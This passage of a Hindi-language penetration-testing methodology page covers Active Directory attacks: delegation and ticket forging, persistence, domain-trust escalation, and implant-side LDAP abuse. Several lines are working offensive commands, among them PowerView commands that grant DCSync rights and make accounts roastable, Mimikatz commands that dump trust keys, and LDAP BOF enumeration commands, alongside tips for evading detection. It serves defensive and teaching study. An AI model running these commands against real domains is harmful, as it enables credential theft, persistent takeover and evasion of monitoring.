unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

यदि किसी user या computer को "Constrained Delegation" के लिए अनुमति है तो वह किसी कंप्यूटर पर कुछ services तक पहुंचने के लिए **किसी भी user का impersonate** कर पाएगा।\
यदि आप इस user/computer का **hash compromise** कर लेते हैं तो आप किसी भी user (यहाँ तक कि domain admins भी) का **impersonate** करके कुछ services तक पहुँच सकते हैं।


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

किसी remote computer के Active Directory object पर **WRITE** privilege होने से **elevated privileges** के साथ code execution हासिल करना संभव हो जाता है:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Compromised user के पास कुछ domain objects पर **दिलचस्प privileges** हो सकते हैं जो आपको आगे चलकर lateral **move/privilege escalate** करने में मदद कर सकते हैं।


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Domain के भीतर **Spool service listening** का पता लगना **abuse** किया जा सकता है ताकि **नई credentials प्राप्त** की जा सकें और **privileges escalate** किए जा सकें।


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

यदि **अन्य users** compromised मशीन तक **access** करते हैं, तो memory से उनकी **credentials gather** करना और यहाँ तक कि उनकी processes में **beacons inject** करके उनका impersonation करना संभव है।\
अक्सर users RDP के माध्यम से सिस्टम में access करते हैं, इसलिए यहाँ तीसरे पक्ष के RDP sessions पर कुछ attacks करने का तरीका दिया गया है:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** एक सिस्टम प्रदान करता है जो domain-joined computers पर **local Administrator password** को manage करता है, यह सुनिश्चित करते हुए कि वह **randomized**, unique और अक्सर **changed** हो। ये passwords Active Directory में store होते हैं और access केवल authorized users को ACLs के माध्यम से नियंत्रित होती है। यदि इन passwords तक पहुँचने के लिए पर्याप्त permissions हों, तो अन्य computers में pivot करना संभव हो जाता है।


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

Compromised मशीन से **certificates collect** करना environment के अंदर privileges escalate करने का एक तरीका हो सकता है:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

यदि **vulnerable templates**configured हैं तो उनका दुरुपयोग करके privileges escalate किया जा सकता है:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

एक बार जब आपको **Domain Admin** या उससे बेहतर **Enterprise Admin** privileges मिल जाएं, तो आप **domain database**: _ntds.dit_ **dump** कर सकते हैं।

[**DCSync attack के बारे में अधिक जानकारी यहाँ मिल सकती है**](dcsync.md)。

[**NTDS.dit चोरी करने के बारे में अधिक जानकारी यहाँ मिल सकती है**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

पहले चर्चा की गई कुछ techniques persistence के लिए भी इस्तेमाल की जा सकती हैं।\
उदाहरण के लिए आप कर सकते हैं:

- उपयोगकर्ताओं को [**Kerberoast**](kerberoast.md) के लिए vulnerable बनाना

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- उपयोगकर्ताओं को [**ASREPRoast**](asreproast.md) के लिए vulnerable बनाना

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- किसी user को [**DCSync**](#dcsync) privileges देना

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack** एक वैध Ticket Granting Service (TGS) ticket बनाता है किसी विशेष service के लिए, जिसका उपयोग **NTLM hash** (उदाहरण के लिए, **PC account का hash**) करके किया जाता है। यह विधि service privileges तक पहुँचने के लिए प्रयुक्त होती है।


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** में attacker Active Directory (AD) environment में **krbtgt account का NTLM hash** हासिल कर लेता है। यह account विशेष है क्योंकि यह सभी **Ticket Granting Tickets (TGTs)** को sign करने के लिए उपयोग किया जाता है, जो AD नेटवर्क में authenticate करने के लिए आवश्यक होते हैं।

एक बार attacker इस hash को प्राप्त कर लेता है, वह किसी भी account के लिए **TGTs** बना सकता है (Silver ticket attack जैसा)。


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

ये golden tickets जैसे होते हैं, पर इन्हें इस तरह forge किया जाता है कि वे सामान्य golden ticket detection mechanisms को **बायपास** कर दें।


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**किसी account के certificates रखना या उन्हें request करने में सक्षम होना** users के account में persist करने का बहुत अच्छा तरीका है (यहाँ तक कि अगर user पासवर्ड बदल भी दे तो भी):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Certificates का उपयोग domain के अंदर उच्च privileges के साथ भी persist करने के लिए किया जा सकता है:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory में **AdminSDHolder** object privileged groups (जैसे Domain Admins और Enterprise Admins) की सुरक्षा सुनिश्चित करता है, उन समूहों पर एक standard **Access Control List (ACL)** apply करके unauthorized changes को रोकने के लिए। हालांकि, इस feature का दुरुपयोग किया जा सकता है; यदि attacker AdminSDHolder के ACL में बदलाव करके किसी सामान्य user को full access दे देता है, तो वह user सभी privileged groups पर व्यापक नियंत्रण प्राप्त कर लेता है। यह सुरक्षा उपाय, जो संरक्षण के लिए है, यदि नज़दीकी निगरानी न हो तो उल्टा प्रभाव डाल सकता है और अनचाही पहुँच की अनुमति दे सकता है।

[**AdminDSHolder Group के बारे में अधिक जानकारी यहाँ।**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

प्रत्येक **Domain Controller (DC)** के अंदर एक **local administrator** account मौजूद होता है। ऐसी मशीन पर admin rights प्राप्त करके, local Administrator hash को **mimikatz** का उपयोग कर extract किया जा सकता है। उसके बाद registry modification आवश्यक होता है ताकि **इस password का उपयोग सक्षम** किया जा सके, जिससे local Administrator account में remote access संभव हो जाए।


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

आप कुछ specific domain objects पर किसी **user** को कुछ **special permissions** दे सकते हैं जिससे वह भविष्य में privileges escalate कर सके।


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** का उपयोग किसी object के ऊपर मौजूद **permissions** को **store** करने के लिए किया जाता है। अगर आप सिर्फ़ किसी object के security descriptor में एक छोटा सा बदलाव कर दें, तो आप उस object पर सदस्यता के बिना भी बहुत दिलचस्प privileges प्राप्त कर सकते हैं।


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

`dynamicObject` auxiliary class का दुरुपयोग करके short-lived principals/GPOs/DNS records बनाए जा सकते हैं जिनमें `entryTTL`/`msDS-Entry-Time-To-Die` हो; ये self-delete हो जाते हैं बिना tombstones के, LDAP सबूत मिटा देते हैं जबकि orphan SIDs, broken `gPLink` references, या cached DNS responses छोड़ जाते हैं (उदा., AdminSDHolder ACE pollution या malicious `gPCFileSysPath`/AD-integrated DNS redirects)।

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

LSASS में memory स्तर पर बदलाव करके एक **universal password** स्थापित कर दें, जिससे सभी domain accounts तक पहुँच मिल जाए।


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
आप अपना **SSP** बना सकते हैं ताकि मशीन तक पहुँचने के लिए उपयोग किए जाने वाले **credentials** को **clear text** में capture किया जा सके।


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

यह AD में एक **नया Domain Controller** register करता है और इसे उपयोग करके निर्दिष्ट objects पर attributes (SIDHistory, SPNs...) **push** करता है बिना उन **modifications** के बारे में कोई **logs** छोड़े। इसके लिए आपको DA privileges और root domain के अंदर होना आवश्यक है।\
ध्यान दें कि यदि आप गलत data उपयोग करते हैं, तो काफी बुरे logs दिखाई देंगे।


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

पहले हमने चर्चा की थी कि यदि आपके पास **LAPS passwords पढ़ने** की पर्याप्त permission है तो कैसे privileges escalate किए जा सकते हैं। हालांकि, इन passwords का उपयोग **persistence बनाए रखने** के लिए भी किया जा सकता है।\
देखें:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft **Forest** को security boundary के रूप में देखता है। इसका अर्थ है कि **एक single domain का compromise पूरे Forest के compromise तक ले जा सकता है**।

### Basic Information

एक [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) एक security mechanism है जो एक domain के user को दूसरे domain के resources तक पहुँचने में सक्षम बनाता है। यह मूल रूप से दो domains के authentication systems के बीच एक linkage बनाता है, जिससे authentication verifications seamless रूप से flow कर सकें। जब domains trust सेटअप करते हैं, तो वे अपने Domain Controllers (DCs) में specific **keys** exchange और retain करते हैं, जो trust की integrity के लिए महत्वपूर्ण होते हैं।

एक आम परिदृश्य में, यदि कोई user trusted domain के किसी service तक पहुँचने का इरादा रखता है, तो उसे पहले अपने domain के DC से एक विशेष ticket जिसे **inter-realm TGT** कहा जाता है, request करना होगा। यह TGT एक साझा **key** के साथ encrypt किया जाता है जो दोनों domains ने सहमति से साझा की होती है। फिर user यह TGT trusted domain के **DC** के पास प्रस्तुत करता है ताकि service ticket (**TGS**) प्राप्त किया जा सके। जब trusted domain का DC inter-realm TGT को validate कर लेता है तो वह TGS जारी करता है, जिससे user को service तक पहुँच मिलती है।

**Steps**:

1. एक **client computer** **Domain 1** में प्रक्रिया शुरू करता है जब वह अपने **NTLM hash** का उपयोग करके अपने **Domain Controller (DC1)** से **Ticket Granting Ticket (TGT)** request करता है।
2. यदि client सफलतापूर्वक authenticate होता है तो DC1 नया TGT जारी करता है।
3. फिर client **Domain 2** के resources तक पहुँचने के लिए DC1 से एक **inter-realm TGT** request करता है।
4. inter-realm TGT उस **trust key** के साथ encrypt किया जाता है जो DC1 और DC2 के बीच two-way domain trust के हिस्से के रूप में साझा की गई होती है।
5. client inter-realm TGT लेकर **Domain 2 के Domain Controller (DC2)** के पास जाता है।
6. DC2 अपने साझा trust key का उपयोग करके inter-realm TGT verify करता है और यदि valid हो तो उस server के लिए **Ticket Granting Service (TGS)** जारी करता है जिसे client access करना चाहता है।
7. अंत में, client यह TGS server को प्रस्तुत करता है, जो server के account hash के साथ encrypt होता है, ताकि Domain 2 में सेवा तक पहुँच प्राप्त की जा सके।

### Different trusts

यह ध्यान देना महत्वपूर्ण है कि **trust 1 way या 2 ways** हो सकता है। 2-way विकल्प में दोनों domains एक-दूसरे पर trust करते हैं, लेकिन **1-way** trust relation में एक domain **trusted** होगा और दूसरा **trusting** होगा। पिछले मामले में, **trusted domain** से आप केवल **trusting domain** के अंदर ही resources तक पहुँच पाएंगे।

यदि Domain A, Domain B पर trust करता है, तो A trusting domain है और B trusted domain है। इसके अलावा, **Domain A** में यह एक **Outbound trust** होगा; और **Domain B** में यह एक **Inbound trust** होगा।

**Different trusting relationships**

- **Parent-Child Trusts**: यह एक सामान्य सेटअप है उसी forest के भीतर, जहाँ child domain अपने parent domain के साथ स्वचालित रूप से two-way transitive trust रखता है। इसका मतलब यह है कि authentication requests parent और child के बीच आसानी से flow कर सकते हैं।
- **Cross-link Trusts**: जिन्हें "shortcut trusts" भी कहा जाता है, ये child domains के बीच स्थापित किए जाते हैं ताकि referral processes तेज हों। जटिल forests में, authentication referrals आमतौर पर forest root तक ऊपर और फिर target domain तक नीचे यात्रा करते हैं। cross-links बनाकर यह यात्रा छोटा किया जा सकता है, जो विशेष रूप से भौगोलिक रूप से फैले environments में लाभकारी होता है।
- **External Trusts**: ये अलग, unrelated domains के बीच सेट किए जाते हैं और by nature non-transitive होते हैं। [Microsoft के documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) के अनुसार, external trusts उन domains के resources तक पहुँचने के लिए उपयोगी होते हैं जो current forest से बाहर हैं और जिन्हें forest trust द्वारा जोड़ा नहीं गया है। external trusts के साथ SID filtering से security बढ़ाई जाती है।
- **Tree-root Trusts**: ये trusts forest root domain और newly added tree root के बीच स्वतः स्थापित होते हैं। जबकि इन्हें आमतौर पर नहीं देखा जाता, tree-root trusts नए domain trees को एक forest में जोड़ने के लिए महत्वपूर्ण होते हैं, उन्हें एक unique domain name बनाए रखने और two-way transitivity सुनिश्चित करने में सक्षम बनाते हैं। अधिक जानकारी [Microsoft guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) में मिल सकती है।
- **Forest Trusts**: यह प्रकार दो forest root domains के बीच एक two-way transitive trust होता है, जो सुरक्षा उपायों को मजबूत करने के लिए SID filtering भी लागू करता है।
- **MIT Trusts**: ये trusts non-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domains के साथ स्थापित किए जाते हैं। MIT trusts थोड़े अधिक specialized होते हैं और उन environments के लिए होते हैं जिन्हें Windows पारिस्थितिकी तंत्र के बाहर Kerberos-based systems के साथ integration की आवश्यकता होती है।

#### Other differences in **trusting relationships**

- एक trust relationship **transitive** भी हो सकती है (A trust B, B trust C, तो A trust C) या **non-transitive** भी।
- एक trust relationship **bidirectional trust** के रूप में सेट किया जा सकता है (दोनों एक-दूसरे पर trust करते हैं) या **one-way trust** के रूप में (केवल एक ही दूसरे पर trust करता है)।

### Attack Path

1. **Enumerate** करें trusting relationships
2. देखें क्या कोई **security principal** (user/group/computer) के पास **other domain** के resources तक **access** है, संभवत: ACE entries या दूसरे domain के groups में होने की वजह से। **Domains के पार relationships** की तलाश करें (शायद trust इसी के लिए बनाया गया था)।
1. इस मामले में kerberoast एक और विकल्प हो सकता है।
3. उन **accounts** को **compromise** करें जो domains के बीच **pivot** कर सकते हैं।

Attackers के पास किसी अन्य domain में resources तक पहुँचने के तीन प्रमुख mechanisms हो सकते हैं:

- **Local Group Membership**: Principals को मशीनों पर local groups में जोड़ा जा सकता है, जैसे किसी server पर “Administrators” group, जिससे उन्हें उस मशीन पर काफी control मिल जाता है।
- **Foreign Domain Group Membership**: Principals foreign domain के groups के सदस्य भी हो सकते हैं। हालांकि, इस विधि की प्रभावशीलता trust की प्रकृति और group के scope पर निर्भर करती है।
- **Access Control Lists (ACLs)**: Principals को एक **ACL** में specify किया जा सकता है, विशेष रूप से **DACL** के अंदर **ACE** के रूप में, जिससे उन्हें specific resources तक access मिलती है। ACLs, DACLs, और ACEs के मैकेनिक्स में गहराई से जाने के लिए, whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” एक अनमोल संसाधन है।

### Find external users/groups with permissions

आप **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** में domain के foreign security principals खोज सकते हैं। ये external domain/forest के user/group होंगे।

आप इसे **Bloodhound** में जांच सकते हैं या powerview का उपयोग करके:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
domain trusts को सूचीबद्ध करने के अन्य तरीके:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> यहाँ **2 trusted keys** हैं, एक _Child --> Parent_ के लिए और दूसरा _Parent_ --> _Child_ के लिए।\
> आप current domain द्वारा उपयोग किए जाने वाले key को निम्न कमांड से देख सकते हैं:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Trust का दुरुपयोग कर SID-History injection के माध्यम से Enterprise admin के रूप में child/parent domain में escalate करें:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

यह समझना महत्वपूर्ण है कि Configuration Naming Context (NC) का कैसे दुरुपयोग किया जा सकता है। Configuration NC Active Directory (AD) वातावरण में पूरे forest भर के configuration डेटा का एक central repository है। यह डेटा forest के प्रत्येक Domain Controller (DC) पर replicate होता है, और writable DCs Configuration NC की writable copy को बनाए रखते हैं। इसे exploit करने के लिए आपके पास किसी DC पर **SYSTEM privileges on a DC** होना चाहिए, बेहतर होगा यदि वह child DC हो।

**Link GPO to root DC site**

Configuration NC के Sites container में AD forest के भीतर सभी domain-joined computers के sites की जानकारी शामिल होती है। किसी भी DC पर **SYSTEM privileges** के साथ काम करके, attackers GPOs को root DC sites से लिंक कर सकते हैं। यह कार्रवाई उन sites पर लागू की जाने वाली policies को बदलकर root domain को संभावित रूप से compromise कर सकती है।

विस्तृत जानकारी के लिए, आप [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research) पर हुए रिसर्च का अध्ययन कर सकते हैं।

**Compromise any gMSA in the forest**

एक attack vector domain के भीतर privileged gMSAs को लक्षित करने से संबंधित है। gMSA के passwords की गणना के लिए आवश्यक KDS Root key Configuration NC में स्टोर रहती है। किसी भी DC पर **SYSTEM privileges** होने पर, KDS Root key तक पहुँचकर पूरे forest में किसी भी gMSA के passwords की गणना करना संभव है।

Detailed analysis and step-by-step guidance can be found in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

पूरक delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Additional external research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

यह तरीका धैर्य मांगता है — नए privileged AD objects के बनने का इंतज़ार करना। SYSTEM privileges के साथ, कोई attacker AD Schema को modify कर सकता है ताकि किसी भी user को सभी classes पर complete control दिया जा सके। इससे नए बने AD objects के ऊपर unauthorized access और control प्राप्त होना संभव हो जाता है।

Further reading is available on [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

ADCS ESC5 vulnerability का लक्ष्य Public Key Infrastructure (PKI) objects पर control हासिल करना है, ताकि एक certificate template बनाया जा सके जो forest के किसी भी user के रूप में authentication सक्षम करे। चूंकि PKI objects Configuration NC में रहते हैं, एक writable child DC को compromise करके ESC5 attacks को अंजाम दिया जा सकता है।

More details on this can be read in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). ऐसे परिदृश्यों में जहाँ ADCS मौजूद नहीं है, attacker आवश्यक components सेटअप करने में सक्षम होता है, जैसा कि [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/) में चर्चा की गई है।

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
इस परिदृश्य में **आपके डोमेन पर एक बाहरी डोमेन द्वारा ट्रस्ट किया गया है**, जिससे आपको उस पर **अनिर्धारित permissions** प्राप्त होते हैं। आपको पता लगाना होगा कि **आपके डोमेन के कौन से principals को बाहरी डोमेन पर कौन-सा access है** और फिर उसे exploit करने का प्रयास करना होगा:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### बाहरी Forest डोमेन - एक-तरफा (आउटबाउंड)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
इस परिदृश्य में **आपका डोमेन** किसी **विभिन्न डोमेन** के principal को कुछ **privileges** ट्रस्ट कर रहा है।

हालाँकि, जब एक **domain is trusted** होता है trusting डोमेन द्वारा, तो trusted डोमेन एक **user बनाता है** जिस का नाम **predictable name** होता है और जो पासवर्ड के रूप में **trusted password** का उपयोग करता है। इसका मतलब यह है कि trusting डोमेन के किसी user तक पहुँचकर trusted डोमेन में प्रवेश किया जा सकता है, उसे एनेमरेट किया जा सकता है और और अधिक privileges बढ़ाने की कोशिश की जा सकती है:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Trusted डोमेन को समझौता करने का एक और तरीका है domain trust की **विपरीत दिशा** में बनाया गया [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) खोजना (जो बहुत आम नहीं है).

Trusted डोमेन को समझौता करने का एक और तरीका है उस मशीन पर इंतज़ार करना जहाँ से एक **trusted domain का user** RDP के जरिए लॉगिन कर सके। फिर attacker RDP session process में कोड inject कर सकता है और वहाँ से पीड़ित के मूल डोमेन तक पहुँच सकता है.  
इसके अलावा, यदि **पीड़ित ने अपना हार्ड ड्राइव माउंट किया हुआ है**, तो **RDP session** process से attacker हार्ड ड्राइव के **startup folder** में **backdoors** स्टोर कर सकता है। इस तकनीक को **RDPInception** कहा जाता है।


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### डोमेन ट्रस्ट के दुरुपयोग का निवारण

### **SID Filtering:**

- forest trusts के पार SID history attribute का उपयोग करने वाले हमलों का जोखिम SID Filtering द्वारा कम किया जाता है, जो सभी inter-forest trusts पर डिफ़ॉल्ट रूप से सक्रिय होता है। यह इस धारणा पर आधारित है कि intra-forest trusts सुरक्षित होते हैं, क्योंकि Microsoft के अनुसार forest को security boundary माना जाता है न कि domain को।
- हालाँकि, एक समस्या यह है कि SID filtering एप्लिकेशन और user access को प्रभावित कर सकता है, जिसके कारण इसे कभी-कभी निष्क्रिय कर दिया जाता है।

### **Selective Authentication:**

- inter-forest trusts के लिए, Selective Authentication यह सुनिश्चित करता है कि दोनों forests के users स्वचालित रूप से authenticated न हों। इसके बजाय, users को trusting domain या forest के अंदर domains और servers तक पहुँचने के लिए स्पष्ट permissions की आवश्यकता होती है।
- यह ध्यान देना महत्वपूर्ण है कि ये उपाय writable Configuration Naming Context (NC) के शोषण या trust account पर होने वाले हमलों के खिलाफ सुरक्षा प्रदान नहीं करते।

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## ऑन-होस्ट इम्प्लांट्स से LDAP-आधारित AD दुरुपयोग

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) bloodyAD-style LDAP primitives को x64 Beacon Object Files के रूप में पुनः-इम्प्लीमेंट करता है जो पूरी तरह on-host implant (e.g., Adaptix C2) के अंदर चलते हैं। ऑपरेटर पैक को `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` के साथ कंपाइल करते हैं, `ldap.axs` लोड करते हैं, और फिर beacon से `ldap <subcommand>` कॉल करते हैं। सारा ट्रैफ़िक वर्तमान logon security context पर LDAP (389) में signing/sealing के साथ या LDAPS (636) में auto certificate trust के साथ चलता है, इसलिए कोई socks proxies या disk artifacts आवश्यक नहीं होते।

### इम्प्लांट-साइड LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` short names/OU paths को full DNs में resolve करके संबंधित objects को dump करते हैं।
- `get-object`, `get-attribute`, and `get-domaininfo` arbitrary attributes (including security descriptors) और `rootDSE` से forest/domain metadata खींचते हैं।
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` roasting candidates, delegation settings, और LDAP से सीधे मौज़ूद [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors को उजागर करते हैं।
- `get-acl` and `get-writable --detailed` DACL को parse करके trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), और inheritance की सूची देते हैं, जिससे ACL privilege escalation के लिए तत्काल लक्ष्य मिलते हैं।
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) ऑपरेटर को नए principals या machine accounts जहाँ भी OU rights मौजूद हों वहाँ स्टेज करने देते हैं। `add-groupmember`, `set-password`, `add-attribute`, और `set-attribute` सीधे लक्ष्यों को हाईजैक कर देते हैं जब write-property rights मिल जाते हैं।
- ACL-focused commands जैसे `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, और `add-dcsync` किसी भी AD object पर WriteDACL/WriteOwner को पासवर्ड रिसेट, group membership control, या DCSync replication privileges में ट्रांसलेट करते हैं बिना PowerShell/ADSI artifacts छोड़े। `remove-*` counterparts inject किए गए ACEs को साफ़ कर देते हैं।

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` तुरंत एक compromised user को Kerberoastable बना देते हैं; `add-asreproastable` (UAC toggle) इसे AS-REP roasting के लिए मार्क करता है बिना password छुए।
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) beacon से `msDS-AllowedToDelegateTo`, UAC flags, या `msDS-AllowedToActOnBehalfOfOtherIdentity` को rewrite करते हैं, जिससे constrained/unconstrained/RBCD attack paths सक्षम होते हैं और remote PowerShell या RSAT की आवश्यकता खत्म हो जाती है।

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` नियंत्रित principal के SID history में privileged SIDs inject करता है (see [SID-History Injection](sid-history-injection.md)), LDAP/LDAPS के जरिए stealthy access inheritance प्रदान करता है।
- `move-object` computers या users का DN/OU बदलता है, जिससे एक attacker assets को उन OUs में खींच सकता है जहाँ delegated rights पहले से मौजूद हों और फिर `set-password`, `add-groupmember`, या `add-spn` का दुरुपयोग कर सकता है।
- Tightly scoped removal commands (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, आदि) operator द्वारा credentials या persistence harvest करने के बाद त्वरित rollback की अनुमति देती हैं, जिससे telemetry कम होती है।

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## कुछ सामान्य रक्षा उपाय

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **क्रेडेंशियल सुरक्षा के लिए रक्षात्मक उपाय**

- **Domain Admins Restrictions**: सिफारिश है कि Domain Admins को केवल Domain Controllers पर ही लॉगिन की अनुमति होनी चाहिए और उन्हें अन्य hosts पर उपयोग करने से बचना चाहिए।
- **Service Account Privileges**: सुरक्षा बनाए रखने के लिए services को Domain Admin (DA) privileges के साथ नहीं चलाना चाहिए।
- **Temporal Privilege Limitation**: DA privileges वाले कार्यों के लिए उनकी अवधि सीमित रखनी चाहिए। इसे इस तरह किया जा सकता है: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Audit Event IDs 2889/3074/3075 का ऑडिट करें और फिर LDAP MITM/relay प्रयासों को रोकने के लिए DCs/clients पर LDAP signing तथा LDAPS channel binding लागू करें।

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Deception Techniques लागू करना**

- Deception लागू करने में traps सेट करना शामिल है, जैसे decoy users या computers, जिनके features में passwords that do not expire या जिन्हें Trusted for Delegation के रूप में मार्क किया गया हो। विस्तृत दृष्टिकोण में specific rights वाले users बनाना या उन्हें high privilege groups में जोड़ना शामिल है।
- एक व्यवहारिक उदाहरण में निम्न tools का उपयोग शामिल है: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Deception techniques deploy करने के बारे में अधिक जानकारी [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception) पर मिलती है।

### **Deception की पहचान**

- **For User Objects**: संदिग्ध संकेतों में atypical ObjectSID, कम बार के logons, creation dates, और low bad password counts शामिल हैं।
- **General Indicators**: संभावित decoy objects के attributes की तुलना असली objects से करने पर inconsistencies उजागर हो सकती हैं। Tools जैसे [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) ऐसी deceptions की पहचान करने में मदद कर सकते हैं।

### **Detection Systems को बायपास करना**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: ATA detection से बचने के लिए Domain Controllers पर session enumeration से बचें।
